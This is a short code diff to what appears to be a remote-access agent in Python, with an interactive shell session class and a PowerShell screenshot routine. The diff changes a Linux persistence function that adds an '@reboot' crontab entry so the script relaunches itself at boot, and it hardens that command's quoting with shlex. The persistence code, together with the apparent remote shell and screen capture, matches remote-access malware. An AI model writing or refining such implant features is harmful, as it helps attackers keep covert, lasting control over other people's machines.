@@ -7,6 +7,7 @@ import os
 import platform
 import queue
 import random
+import shlex
 import shutil
 import signal
 import socket
@@ -226,7 +227,7 @@ class InteractiveShellSession:
             self._write_bytes(b"\x03", append_newline=False)
         elif platform.system() == "Windows":
             with suppress(Exception):
-                self.process.send_signal(signal.CTRL_BREAK_EVENT)  # type: ignore[attr-defined]
+                self.process.send_signal(signal.CTRL_BREAK_EVENT)
         else:
             with suppress(Exception):
                 self.process.send_signal(signal.SIGINT)
@@ -787,9 +788,9 @@ $bitmap.Dispose()
 
     def _install_linux_persistence(self, task_id: str) -> Dict[str, Any]:
         script_path = os.path.abspath(__file__)
-        cron_cmd = f'@reboot python3 {script_path}'
+        cron_cmd = f'@reboot python3 {shlex.quote(script_path)}'
         result = subprocess.run(
-            f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -',
+            f'(crontab -l 2>/dev/null; echo {shlex.quote(cron_cmd)}) | crontab -',
             shell=True,
             capture_output=True,
             text=True,
